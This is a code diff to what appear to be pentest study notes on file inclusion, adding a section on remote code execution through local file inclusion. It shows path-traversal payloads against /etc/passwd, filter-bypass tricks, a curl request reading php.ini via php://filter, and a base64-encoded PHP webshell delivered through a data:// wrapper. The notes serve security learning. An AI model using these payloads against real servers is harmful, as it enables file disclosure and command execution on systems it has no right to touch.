@@ -862,7 +862,7 @@ NOTE: all the placeholders/columns must be satisfied. for columns use open,close
               {
                 slug: "file-inclusion",
                 title: "File Inclusion",
-                body: `# Common Target Files
+                body: `## Common Target Files
 
 Commonly targeted files on both and Windows systems.
 
@@ -880,7 +880,7 @@ Commonly targeted files on both and Windows systems.
 | /var/log/apache2/access.log | Logs all requests made to the Apache web server. |  
 | C:\\boot.ini | Contains boot options for Windows computers with  firmware. |
 
-# Local File Inclusion (LFI)
+# File Disclosure using LFI
 
 **NOTE:** Encoded <span class="cmd">../</span> : <span class="cmd">%2e%2e%2f</span>
 
@@ -894,7 +894,7 @@ Usual default web root: <span class="cmd">/var/www/html</span>  so location of: 
 ## Appended Extensions
 
 Append <span class="cmd">**%00**</span> (Null Byte) at the end of file - Stops processing string after that point  
-<span class="cmd">../../../etc/passwd </span><span class="cmd">**%00**</span>
+<span class="cmd">../../../etc/passwd</span><span class="cmd">**%00**</span>
 
 ## Bypass Path Filters
 
@@ -921,7 +921,7 @@ Add it in the start and traverse out of it. One extra <span class="cmd">**../**<
 ## Stripping ../ from input
 
 Use <span class="cmd">**....//**</span> instead  
-When <span class="cmd">../</span> from each <span class="cmd">....//</span>, it leaves <span class="cmd">../</span>
+When <span class="cmd">../</span> is removed from each <span class="cmd">....//</span>, it leaves <span class="cmd">../</span>
 
 ![Screenshot 1 in File Inclusion notes](/notes/file-inclusion/img1.png)
 
@@ -959,7 +959,26 @@ Eg: <span class="cmd">http://[MACHINE_IP]:[PORT]/index.php?language=php://filter
 • Decode the returned base64 string:  
 <span class="cmd">echo 'BASE64_STRING' | base64 -d</span>
 
-# PHP Wrappers`,
+# Remote Code Execution using LFI
+
+## PHP Wrappers
+
+### Data
+
+Data wrapper can be used to include external data, including php code. <span class="cmd">allow_url_include</span> must be enabled in PHP configurations.  
+• Check PHP configurations  
+<span class="cmd">X.Y</span> : PHP Version  
+Apache: <span class="cmd">/etc/php/X.Y/apache2/php.ini</span>  
+Nginx: <span class="cmd">/etc/php/X.Y/fpm/php.ini</span>  
+Eg: <span class="cmd">curl "http://[SERVER_IP]:[PORT]/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"</span>  
+• Take the base64 string, decode and search for <span class="cmd">allow_url_include</span> with grep  
+If <span class="cmd">allow_url_include</span> is On then:  
+Encode basic PHP webshell into base64:  
+<span class="cmd">echo '<?php system($_GET["cmd"]); ?>' | base64</span>  
+Then URL encode the base64 text and pass it to the data wrapper. We can then pass the command to the webshell:  
+<span class="cmd">data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id</span>
+
+### Input`,
               },
               {
                 slug: "file-upload",
